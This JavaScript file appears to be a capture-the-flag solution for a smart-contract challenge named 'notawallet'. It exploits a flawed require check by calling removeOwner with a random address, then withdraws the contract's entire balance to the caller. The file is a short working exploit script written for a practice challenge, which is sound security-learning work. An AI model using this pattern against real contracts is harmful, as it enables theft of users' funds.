const fs = require("fs");

const Solution = require("../Solution");
const { NOTAWALLET_ADDR } = require("../../config/addresses");

class NotAWalletSolution extends Solution {
    constructor() {
        super(NOTAWALLET_ADDR);
    }

    async run() {
        await this.unlock();
        console.log("Running notawallet solution...");
        await this.printBalances();
        try {
            const randomHex = this.w3.utils.randomHex(20);
            const randomAddr = this.w3.utils.toChecksumAddress(randomHex);

            const challengeAbi = JSON.parse(fs.readFileSync("./challenges/notawallet/NotAWallet.abi", "utf-8"));
            const challengeContract = new this.w3.eth.Contract(challengeAbi, this.challengeAddr);
            console.log("Exploiting require");
            await challengeContract.methods.removeOwner(randomAddr).send({ from: this.myAddr });
            console.log("Exploited require");
            console.log("Withdrawing balance");
            await challengeContract.methods.withdraw(await this.w3.eth.getBalance(this.challengeAddr)).send({ from: this.myAddr });
            console.log("Done!");
        } catch (err) {
            console.error(err);
        }
        await this.printBalances();
    }
}

module.exports = NotAWalletSolution;
